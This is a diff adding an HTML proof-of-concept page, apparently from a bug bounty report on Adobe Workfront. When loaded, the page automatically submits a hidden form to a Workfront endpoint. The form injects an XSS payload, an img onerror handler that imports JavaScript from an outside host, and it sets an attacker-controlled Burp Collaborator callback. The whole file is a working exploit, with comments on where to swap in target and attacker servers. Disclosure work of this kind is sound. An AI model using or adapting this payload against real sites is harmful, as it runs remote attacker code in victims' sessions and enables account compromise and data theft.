@@ -1,0 +1,32 @@
+<html>
+
+<body>
+  <form id="form" action="" method="POST">
+    <input id="payload" type="hidden" name="overrideEmptyPage" value="" />
+  </form>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const callbackparam = '&callback='
+      const endpoint = '/tile?content=list-restorable-docs';
+
+      // Triage - Change this to your workfront instance
+      const workfrontinstance = 'https://hackerone-ongoing-tgmst5.testdrive.workfront.com'
+
+      // Triage - Change this to your attacker controlled server e.g. burp collab url
+      const callback = 'fatywcowa7okcmahb4js0ts3eukl8lwa.oastify.com';
+
+      const formEle = document.getElementById("form");
+      formEle.action = `${workfrontinstance}${endpoint}${callbackparam}${callback}`;
+
+
+      const field = document.getElementById("payload");
+
+      field.value = "<img src=x onerror=import('https:vocteamtestdomain.eu//wf-xss.php')>";
+      document.forms[0].submit();
+    });
+
+  </script>
+</body>
+
+</html>
+
